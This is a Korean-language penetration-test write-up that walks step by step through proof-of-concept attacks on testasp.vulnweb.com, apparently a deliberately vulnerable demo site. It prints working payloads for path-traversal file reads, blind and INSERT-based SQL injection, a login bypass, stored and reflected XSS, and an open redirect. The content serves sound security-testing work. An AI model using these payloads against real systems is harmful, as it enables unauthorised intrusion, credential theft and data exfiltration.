# PoC 시나리오 — testasp.vulnweb.com

`PoC-코드.md` 의 각 항목을 **실행 순서·맥락**과 함께 서술한다. 코드 원문은 `PoC-코드.md`
참조. 사전 준비: `BASE=http://testasp.vulnweb.com`.

---

## 시나리오 A. 소스코드·자격증명 탈취 (단일 요청, 인증 불필요)

1. 브라우저로 `http://testasp.vulnweb.com/Templatize.asp?item=db.asp` 에 접속한다.
2. 응답 본문에 `Provider=SQLNCLI11;Server=(local)\SQL;Database=acuforum;Uid=acunetix;Pwd=...`
   형태의 **연결 문자열이 평문으로** 들어 있음을 확인한다.
3. 같은 방식으로 `Search.asp`, `Login.asp`, `ShowThread.asp` 를 요청하면 ASP 소스가 그대로
   출력된다 → SQL 쿼리 구조·인증 로직·`RetURL` 리다이렉트 구현이 전부 노출된다.
4. `item=..%2f..%2fwindows%2fwin.ini` 로 `C:\Windows` 까지 읽히는 것을 확인해
   **웹루트 밖 임의 파일 읽기**임을 확정한다(웹루트가 `C:\` 아래 2단계).
5. `web.config`, `.NET machine.config/web.config`, `IIS_schema.xml`, EC2 구성
   (`program files\Amazon\Ec2ConfigService\Settings\config.xml`), `windows\Panther\unattend.xml`
   을 같은 방식으로 수집한다.

**증명되는 것**: ① 임의 파일 읽기, ② 소스코드 노출, ③ DB 자격증명 평문 노출.

---

## 시나리오 B. DB 전체 읽기 (SQLi 오라클, 인증 불필요)

1. `GET /search.asp?tfSearch=zzq')>0 OR (1=1))--` → 게시글 21건 렌더(TRUE).
2. `GET /search.asp?tfSearch=zzq')>0 OR (1=2))--` → 0건(FALSE). **boolean-blind 성립.**
3. 서브쿼리 조건을 넣어 임의 스칼라식을 판정할 수 있음을 확인한다:
   `(SELECT SYSTEM_USER)='acunetix'` → TRUE / `(SELECT DB_NAME())='acuforum'` → TRUE.
4. `PoC-코드.md` 3-2 / `Exploit-코드.md` 1장의 오라클 함수를 붙여
   `exact_int()`·`extract()` 로 문자열·정수를 뽑는다. (Round 8~10 합계 3,764요청, 문자열 1글자 ≈ 7요청)
5. `sys.databases` + `HAS_DBACCESS()` 로 접근 가능 DB 7개(master/tempdb/msdb/acublog/acuforum/acuservice)를
   열거하고, `acuservice.dbo.users`(8컬럼, 카드정보 포함)·`acublog.dbo.users`(3컬럼)·
   `msdb.dbo.backupset`(6건)에 도달한다.
6. 권한 상한을 확인한다: `IS_SRVROLEMEMBER('sysadmin')`, `CONTROL SERVER`, `xp_cmdshell` EXECUTE
   모두 FALSE, `sys.configurations.value_in_use` 전부 0 → **RCE 불가**, 상한은 데이터 유출.

---

## 시나리오 C. 관리자 인증 우회 → 세션 확보

1. `POST /Login.asp` 에 `tfUName=admin`, `tfUPass=x' OR '1'='1` 을 보낸다 → `Location: Default.asp`.
2. 같은 세션 쿠키로 `GET /Default.asp` 요청 시 `logout admin` 이 출력되어 **관리자로 로그인된
   상태**임을 확인한다.
3. 이 세션으로 `/showforum.asp?id=1` 등 인증 필요 페이지에 접근된다.
4. ⚠ `tfUName` 에 따옴표를 넣는 형태(`admin'--`)로 로그인하면 세션 사용자명에 따옴표가 저장되어
   이후 글쓰기 경로가 전부 500이 된다 → 주입은 `tfUPass` 쪽에 넣는다.

**증명되는 것**: 인증 우회(비밀번호 미상 상태에서 관리자 세션 획득).

---

## 시나리오 D. 저장형 XSS → 세션 하이재킹

1. 시나리오 C 로 세션을 얻는다.
2. `POST /showthread.asp?id=0` 에 `tfSubject=RT6-STORED-XSS-PROOF`,
   `tfText=<img src=x onerror=alert(1)>` 을 보내 게시글 1건을 작성한다.
3. **로그아웃 상태(미인증)** 로 `GET /showthread.asp?id=0` 을 요청한다 →
   `class='posttext'><img src=x onerror=alert(1)>` 가 **HTML 인코딩 없이 원문 그대로** 출력된다.
4. 실제 브라우저(CDP)로 같은 URL 을 열면 `alert` 다이얼로그가 1회 발생하고
   (`dialog_count:1`, `message:"1"`), 같은 페이지에서 `Runtime.evaluate("document.cookie")` 로
   **`ASPSESSIONID*` 세션 쿠키가 읽힌다**(`cookie_readable:true` → HttpOnly 미설정).
5. 따라서 피해자가 해당 스레드를 열람하면 공격자 스크립트가 실행되고 세션 쿠키를 외부로 전송할 수
   있다(→ `Exploit-시나리오.md` ②-①, 유출 단계는 미검증).

**증명되는 것**: 저장형 XSS의 **실제 브라우저 실행**과 세션 쿠키 판독 가능성.
(스크린샷 `screenshots/xss_proof.png`, JSON `scratch/round6/out/xss_exec_proof.txt`)

---

## 시나리오 E. 오픈 리다이렉트

1. `POST /Login.asp?RetURL=http%3A%2F%2Fexample.com%2F` (본문은 아무 우회 페이로드) →
   응답 `Location: http://example.com/` 확인.
2. `//example.com/` 형태(프로토콜 상대 URL)도 통과.
3. 로그인 성공 리다이렉트 지점이므로, 정상 로그인 흐름에 공격자 URL을 끼워 넣어
   사용자를 외부로 유도할 수 있다.

---

## 시나리오 F. 반사형 XSS

1. `GET /search.asp?tfSearch=<script>alert(1)</script>` 요청.
2. 응답의 "You searched for '<script>alert(1)</script>'" 부분에 **무이스케이프 반사** 확인.
3. 같은 파라미터가 SQLi 지점이기도 하므로(`search.asp`), 같은 입력이 두 취약점을 동시에 만족한다.

---

## 시나리오 G. 파일 존재 오라클 (LFI 부수 기능)

1. `item` 에 존재하는 파일 → `200` + 본문, 없는 파일 → `500` + 고정 1208B.
2. 이 오라클로 `C:\Windows`, `C:\Program Files`, `C:\inetpub\wwwroot` 하위를 열거해
   47종의 IIS·설정·로그 파일 중 존재 여부를 판별한다(Round 7).
3. **반드시 대조군(`win.ini`)을 함께 보낸다** — 인코딩 실수는 "없음"과 구분되지 않는다.

---

## 시나리오 H. INSERT 기반 SQLi (쓰기) — `/Register.asp`

> ⚠ 상태 변경(쓰기)이므로 **실행 전 사용자 승인이 필요**하다. 이 phase 에서는 승인 후 실증했다.

1. 기준선으로 정상 회원가입을 1건 보낸다(기능 자체가 동작함을 먼저 확인).
2. `tfUName` 에 `rt12x', 'p', 'e', 'r', (SELECT TOP 1 upass FROM users WHERE uname='admin'))--`
   을 넣어 POST 한다. 이때 INSERT 는
   `VALUES ('rt12x','p','e','r',(SELECT TOP 1 upass FROM users WHERE uname='admin'))-- ', 'x','x','x','')`
   로 실행된다(VALUES 5개를 정확히 맞추고 나머지는 주석).
3. 오라클로 판정한다 — **응답 코드(200)가 아니라 행의 내용**을 본다:
   - 주입 행 실존 → TRUE
   - `avatar = (서브쿼리)` → TRUE  ← ★ 서브쿼리가 INSERT 안에서 실행됐다는 증거 = 쓰기 원시능력
   - `email='e'`, `realname='r'`, 정확히 1행 → TRUE
4. 대조군으로 정상값 등록을 1건 더 보내 `avatar=''` 임을 확인한다 → 주입 행만 값이 다름.
5. 쓰기→읽기 체인: 그 행의 `avatar` 를 추출 함수로 읽어 관리자 `upass`(`none`, 4자)를 회수한다.
   교차확인으로 `LEN(upass)=4`, `upass=LOWER(upass)` 도 TRUE.

**증명되는 것**: 인증 없이 **DB 쓰기(INSERT)** 가 가능하다. 상한은 단일 INSERT 문 조작 →
`users` 행 1건 삽입, UPDATE/DELETE 는 불가.
**남는 것**: 삽입 행은 되돌릴 수 없다(DELETE 권한 없음). 또한 이 사이트의 **데모 DB 는 주기적으로
리셋**되므로(시나리오 I) 재현 시 매번 다시 만들어야 한다.

---

## 시나리오 I. 재현 시 반드시 알아야 할 환경 사실 — 데이터가 리셋된다

1. Round 6·7 에서 만든 저장형 XSS 페이로드와 테스트 스레드/게시글이 서버에서 사라졌음을
   오라클로 확인한다(`posts.title LIKE '%RT6-STORED-XSS-PROOF%'` → FALSE,
   `posts/threads.title LIKE 'RT7-%'` → FALSE).
2. `showthread.asp?id=0/1/2` 가 1/2/3건을 렌더하고 `posts ≤30`, `users >200` 인 **원래 데모 상태**로
   복귀해 있음을 확인한다.
3. 따라서 **쓰기 기반 PoC(저장형 XSS·INSERT SQLi)의 증거는 서버에 영구히 남지 않는다**.
   보고서의 재현 절차에는 "게시글·행을 다시 만들라"는 단계가 필수이며, 근거 자료는 실행 시점에
   캡처한 응답·JSON·스크린샷(`scratch/round*/out/`, `screenshots/`)이다.
   취약점 자체는 유효하다 — 같은 요청을 다시 보내면 같은 결과가 나온다.

---

## 부록. 파괴적 코드 경로 확인 절차 (실행하지 않고 판정만)

`ShowThread.asp`/`ShowForum.asp` 소스(시나리오 A에서 획득)에
`total>100` 이면 `DELETE FROM threads/posts WHERE forumid=<id>` 를 실행하는 분기가 있다.
실행 전 판정 절차:

1. 카운트 쿼리 구조 확인: `SELECT COUNT(id) AS total FROM posts WHERE threadid=<주입>` —
   `FROM` 절이 고정이라 `total` 은 **테이블 전체 행수 이하**로 상한이 걸린다.
2. 그 상한을 실측: 전체 행수가 11~25행이면 `total>25`, `total>100` 은 항상 FALSE.
3. 따라서 삭제 분기는 **구조적으로 도달 불가**임을 확정(Round 7).
4. 만약 향후 게시글이 100건을 넘으면 다시 위험해지므로, 실행 직전 상한 재측정을 선행한다.
